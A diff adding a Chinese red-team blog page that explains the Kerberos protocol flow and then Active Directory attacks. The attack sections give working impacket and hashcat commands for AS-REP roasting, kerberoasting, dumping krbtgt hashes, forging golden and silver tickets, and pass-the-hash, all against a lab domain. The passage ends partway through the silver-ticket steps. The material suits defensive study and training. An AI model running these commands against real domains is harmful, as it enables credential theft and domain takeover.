@@ -1,0 +1,1373 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="JD.Army">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="JD.Army">
+    
+        <meta name="keywords" content="JD.Army">
+    
+    <meta name="description" content="Red team of jd inc. ">
+    <meta name="description" content="Kerberos历史kerberos是由MIT为雅典娜项目开发，整个项目目标是为了整合sso、network file systems、A unified graphical environment、naming convention service，从而达到学生和教职工能随时访问MIT的一万多台工作站。其中kerberos主要是为了解决其中的sso认证的问题 kerberos是使用1978年的N">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kerberos基础知识以及攻击面">
+<meta property="og:url" content="http://jd.army/2021/11/04/kerberos%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2/index.html">
+<meta property="og:site_name" content="JD.Army">
+<meta property="og:description" content="Kerberos历史kerberos是由MIT为雅典娜项目开发，整个项目目标是为了整合sso、network file systems、A unified graphical environment、naming convention service，从而达到学生和教职工能随时访问MIT的一万多台工作站。其中kerberos主要是为了解决其中的sso认证的问题 kerberos是使用1978年的N">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/58E92748-7F9B-4C4A-AC70-AC336EDB95D1.JPG">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142740922.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142800246.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212034419.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142818286.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212111049.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142837594.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212150625.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212213208.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142851770.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212234043.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142913324.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101213730623.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101213750134.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101213825277.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104165307466.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211103105528022.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211103105925028.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104162725971.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104162810225.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104103026660.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104103129919.png">
+<meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104103106607.png">
+<meta property="article:published_time" content="2021-11-04T07:47:43.000Z">
+<meta property="article:modified_time" content="2021-11-25T07:49:26.126Z">
+<meta property="article:author" content="JD.Army">
+<meta property="article:tag" content="kerberos">
+<meta property="article:tag" content="AD">
+<meta property="article:tag" content="金票">
+<meta property="article:tag" content="银票">
+<meta property="article:tag" content="kerberosting">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/58E92748-7F9B-4C4A-AC70-AC336EDB95D1.JPG">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>Kerberos基础知识以及攻击面 · JD.Army</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
+    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
+    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>JD.Army</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">JD.Army</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">Kerberos基础知识以及攻击面</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                Kerberos基础知识以及攻击面
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        
+        
+            
+        
+        
+        <span class="post-category" data-categories="渗透基础"">
+            <i class="fas fa-folder post-category-icon"></i>
+            <span class="post-category-text">
+                渗透基础
+            </span>
+        </span>
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="kerberos">kerberos</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="AD">AD</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="金票">金票</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="银票">银票</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="kerberosting">kerberosting</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.4k</span>Reading time: <span class="post-count reading-time">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2021/11/04</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="Kerberos历史"><a href="#Kerberos历史" class="headerlink" title="Kerberos历史"></a>Kerberos历史</h2><p>kerberos是由MIT为雅典娜项目开发，整个项目目标是为了整合sso、network file systems、A unified graphical environment、naming convention service，从而达到学生和教职工能随时访问MIT的一万多台工作站。其中kerberos主要是为了解决其中的sso认证的问题</p>
+<p>kerberos是使用1978年的Needham-schroeder symmetric key protocol协议为基础。目前的kerberos协议是V5版本，并于1993年发布（2005年更新）。</p>
+<p>相比于kerberosV4在kerberosV5版本中添加了以下功能：</p>
+<ul>
+<li>预认证</li>
+<li>基于ASN.1的在线协议</li>
+<li>改变成加盐算法</li>
+<li>委派</li>
+<li>支持转发、更新和过期票据</li>
+<li>重放缓存</li>
+<li>支持跨域认证</li>
+<li>可扩展加密类型</li>
+</ul>
+<h2 id="windows中的kerberos"><a href="#windows中的kerberos" class="headerlink" title="windows中的kerberos"></a>windows中的kerberos</h2><p>windows主机相关认证体系</p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/58E92748-7F9B-4C4A-AC70-AC336EDB95D1.JPG" alt="58E92748-7F9B-4C4A-AC70-AC336EDB95D1"></p>
+<p>在windows中，所有应用层服务的认证都是通过lsass进行的，kerberos、ntlm等网络认证服务都是通过SSPI（windows主机）/GSSAPI(windows服务器)来对LSASS和网络主机提供认证服务。SSP层的各个认证协议在windows中都是以动态链接库存在，并链接着lsass.exe。</p>
+<p>windows中主要提供以下ssp</p>
+<ul>
+<li>NTLM</li>
+<li>Kerberos</li>
+<li>Negotiate</li>
+<li>Secure channel（SChannel）</li>
+<li>Digest SSP</li>
+<li>Credential（CredSSP）</li>
+<li>Distributed Password Authentication（DPA）</li>
+<li>Public key Cryptography User-to-User（PKU2U）</li>
+</ul>
+<h2 id="kerberos详解"><a href="#kerberos详解" class="headerlink" title="kerberos详解"></a>kerberos详解</h2><h3 id="kerberos预认证"><a href="#kerberos预认证" class="headerlink" title="kerberos预认证"></a>kerberos预认证</h3><p>旨在发出KRB_AS_REP消息识别主体之前判断主体的身份。默认情况下，windows域要求在KRB_AS_REQ消息中提供身份验证数据，这在KDC中默认要求所有用户使用的预身份验证机制。kerberos规范本身使用Pre-Authentication标头在TGS-REQ步骤中传递身份验证数据。kerberos预认证主要是防止用户密码爆破。</p>
+<h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142740922.png" alt="image-20211104142740922"></p>
+<p>此流程图是有PAC认证的情况下的流程图，通过此流程图可以看见整个kerberos认证的流程。KDC中主要包含AS（Authentication Service）和TGS（Ticket Granting Service）。</p>
+<h4 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS-REQ"></a>AS-REQ</h4><p>下面分别是认证的流程图和认证数据包。</p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142800246.png" alt="image-20211104142800246"></p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212034419.png" alt="image-20211101212034419"></p>
+<p>在padate中</p>
+<ul>
+<li>KRB5-PADATA-ENC-TIMESTAMP是用户hash加密的时间戳，AS服务器通过用户hash进行解密来获取时间戳，如果时间戳在一定范围内，就验证通过。而PA-PAC-REQUEST主要是为了设置PAC（Privilege Attribute Certificate）扩展。</li>
+</ul>
+<p>在req-body中</p>
+<ul>
+<li><p>cname是请求的用户名，用户名存在与否，返回包是有差异的。（用户名枚举攻击）</p>
+</li>
+<li><p>sname是请求的服务名，通常是krbtgt或者localrealm</p>
+</li>
+<li><p>nonce是随机生成的一个数，有的工具可以通过此特征作为ioc</p>
+</li>
+<li><p>address是客户端的网络名</p>
+</li>
+</ul>
+<h4 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS-REP"></a>AS-REP</h4><p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142818286.png" alt="image-20211104142818286"></p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212111049.png" alt="image-20211101212111049"></p>
+<p>as-rep</p>
+<ul>
+<li><p>ticket用于TGS-REQ的认证，其中enc-part是通过kebtgt的hash进行加密的，其中包含session key和PAC等。（黄金票据）</p>
+</li>
+<li><p>另一个enc-part是可以解密的，key是用户的hash，解密后是Encryptionkey，Encryptionkey中包含session key和nonce等，其中的session key是下一个阶段的认证密钥。（AS-REPRoastin）</p>
+</li>
+</ul>
+<p>完成此步骤后，用户的内存中就已经保存TGT了，后续访问各种服务，只需要生成特定的TGS就行。</p>
+<h4 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS-REQ"></a>TGS-REQ</h4><p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142837594.png" alt="image-20211104142837594"></p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212150625.png" alt="image-20211101212150625"></p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212213208.png" alt="image-20211101212213208"></p>
+<p>padate </p>
+<ul>
+<li>KRB5-PADATA-REQ的值是使用TGT和KRB_AP_REQ的checksum生成的</li>
+</ul>
+<p>ticket</p>
+<ul>
+<li>上个阶段生成的TGT。</li>
+</ul>
+<p>sname</p>
+<ul>
+<li>req-body中的sname主要你需要请求的在SPN中的服务，为了后续生成针对此服务的TGS。</li>
+</ul>
+<p>enc-authorization-data</p>
+<ul>
+<li>此部分首先通过sub-session key加密，如果没有就通过session key进行加密，其中主要包含username和timestamp。</li>
+</ul>
+<h4 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS-REP"></a>TGS-REP</h4><p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142851770.png" alt="image-20211104142851770"></p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212234043.png" alt="image-20211101212234043"></p>
+<p>tgs-rep</p>
+<ul>
+<li><p>ticket中的enc-part部分是使用服务自身的hash进行加密，其中包含service session key、username、PAC等（白银票据、kerberosting）</p>
+</li>
+<li><p>后续的enc-part部分是使用上个阶段的session key进行的加密，解密后得到encryptionkey，而encryptionkey中最重要的是其中的service session key。</p>
+</li>
+</ul>
+<h4 id="AP-REQ"><a href="#AP-REQ" class="headerlink" title="AP-REQ"></a>AP-REQ</h4><p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142913324.png" alt="image-20211104142913324"></p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101213730623.png" alt="image-20211101213730623"></p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101213750134.png" alt="image-20211101213750134"></p>
+<p>ap-req</p>
+<ul>
+<li>ticket中主要是之前生成的tgs票据。</li>
+<li>authenticator主要是用service session key加密的username和timestamp、initial sequence。</li>
+</ul>
+<h4 id="AP-REP"><a href="#AP-REP" class="headerlink" title="AP-REP"></a>AP-REP</h4><p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101213825277.png" alt="image-20211101213825277"></p>
+<p>ap-rep</p>
+<ul>
+<li>其中的enc-part是用etype加密的，其中包含ctime、cusec、sub-session key、initial sequence</li>
+</ul>
+<h3 id="相关攻击"><a href="#相关攻击" class="headerlink" title="相关攻击"></a>相关攻击</h3><p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104165307466.png" alt="image-20211104165307466"></p>
+<h4 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h4><p>当用户存在，但是密码错误是，kerberos会返回KDC_ERR_PREAUTH_FAILED，但是当用户名不存在时，会返回KDC_ERR_C_PRINCIPAL_UNKNOWN。基于此，能在域外对域内的用户进行用户名爆破。</p>
+<p>流量：对一个用户检测一次就需要发送两个KRB5数据包（两个AS-REQ包，预认证+认证）。</p>
+<p>因此总的发包数就是2N个流量包（N是爆破用户数）</p>
+<h4 id="Password-Spraying（密码喷射）"><a href="#Password-Spraying（密码喷射）" class="headerlink" title="Password Spraying（密码喷射）"></a>Password Spraying（密码喷射）</h4><p>此漏洞基于kerberos认证中，当密码错误时，会产生以下回显，密码正确是能直接获取tgt。</p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211103105528022.png" alt="image-20211103105528022"></p>
+<p>发送AS-REQ时，会返回KRB Error：KRB5KDC_ERR_PREAUTH_FAILED，基于这个返回，就能进行域用户密码爆破。</p>
+<p>可以先通过LDAP收集用户名，然后通过固定密码来爆破域内其他账户。也可以配合之前的用户名枚举来撕开一个进入内网的口子。</p>
+<p>流量：和上面的原因一样，也是2N个流量包。</p>
+<h4 id="AS-REPRoasting（离线爆破明文密码）"><a href="#AS-REPRoasting（离线爆破明文密码）" class="headerlink" title="AS-REPRoasting（离线爆破明文密码）"></a>AS-REPRoasting（离线爆破明文密码）</h4><p>在用户开启，Dot not require Kerberos preauthentication时，即在域中设置了不要求Kerberos 预身份认证。在不进行预认证的情况下，能在获取用户tgt后，对tgt中的ticket hash进行爆破。</p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211103105925028.png" alt="image-20211103105925028"></p>
+<p>一、首先进行LDAP查询，查询域内设置了不需要预认证的用户</p>
+<p>查询语法：<code>(&amp;(&amp;(UserAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(!(objectCategory=computer)))</code></p>
+<p>此阶段一共发送三个数据包（2个NTLM认证+1个LDAP认证）</p>
+<p>impacket命令：<code>python GetNPUsers.py windows.local/windows -dc-ip 172.16.178.9 -format hashcat</code></p>
+<p>二、在没有开启预认证的情况下，发送一个AS-REQ包就能获取到一个AS-REP包，通过对REP包中加密的部分通过hashcat进行爆破来获取用户密码。</p>
+<p>此阶段发送一个AS-REQ包</p>
+<p>流量：总共需要发送4N个网络流量包</p>
+<p>hashcat命令：<code>hashcat -m 18200 --force -a 0 上面的hash password.txt</code></p>
+<h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>在用户拥有krbtgt用户的hash后，能通过此hash伪造任意的ticket。从而访问任意域内任意主机的任意服务。</p>
+<p>一、获取krbtgt hash</p>
+<p>获取特定用户的hash，此处是通过域管用户的hash来获取krbtgt用户的hash。</p>
+<p>impacket命令：<code>python secretsdump.py windows.local/windows@172.16.178.9 -hashes 0:9e7620e4e1a34c1fdcf3228896dc9d22 -dc-ip 172.16.178.9 -just-dc-user krbtgt</code></p>
+<p>二、获取域的SID</p>
+<p>获取SID</p>
+<p>impacket命令：<code>python lookupsid.py windows.local/windows@172.16.178.9 -hashes 0:9e7620e4e1a34c1fdcf3228896dc9d22</code></p>
+<p>三、形成金票</p>
+<p>impacket命令：<code>python ticketer.py -nthash ed7879d3854f9d4958533d84d7945d9f -domain-sid S-1-5-21-4142917197-1339067896-309211218 -domain windows.local test</code></p>
+<p>其中，nthash需要是前面获取的krbtgt hash的nt hash，最后的test需要是域内的用户</p>
+<p>四、使用金票</p>
+<p><code>export KRB5CCNAME=/Users/impacket-master/examples/test.ccache;python psexec.py windows.local/test@TEST.windows.local -k -no-pass -dc-ip 172.16.178.9 -debug</code></p>
+<p>注意：</p>
+<ul>
+<li><p>export后是导入的金票</p>
+</li>
+<li><p>域的用户名必须是形成金票的名字</p>
+</li>
+<li><p>目标一定要是具体的机器名，如果在域外，就配置hosts，因为KDC下发tgs前会用SPN查询你的具体机器名，如果是ip就会查不到。</p>
+</li>
+<li><p>如何是域外，需要加-dc-ip或者host中配置域控的ip，域内就不需要。</p>
+</li>
+</ul>
+<p>流量：正常的kerberos访问流量，除了没有tgt获取阶段。</p>
+<h4 id="kerberosting"><a href="#kerberosting" class="headerlink" title="kerberosting"></a>kerberosting</h4><p>此漏洞主要是通过获取服务用户的TGS，获取完成后爆破TGS使用服务hash加密的ticket。</p>
+<p>通过SPN查询域内服务用户.</p>
+<p>impacket命令：<code>python GetUserSPNs.py windows.local/windows:xxxxxxx -request -dc-ip 172.16.178.9</code></p>
+<p>爆破服务用户获取到的tgs-rep密码.</p>
+<p>hashcat命令：<code>hashcat -m 18200 --force -a 0 上面的hash password.txt</code></p>
+<p>流量：4N</p>
+<h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>当拥有服务hash后，通过此服务hash生成TGS，此过程不用访问DC，攻击机器只与目标服务器通信。如果目标服务有PAC认证，则此票据将失效。</p>
+<p>一、获取具体服务用户hash</p>
+<p><code>python secretsdump.py windows.local/windows@172.16.178.9 -hashes 0:9e7620e4e1a34c1fdcf3228896dc9d22 -dc-ip 172.16.178.9 -just-dc-user test</code></p>
+<p>二、获取SID</p>
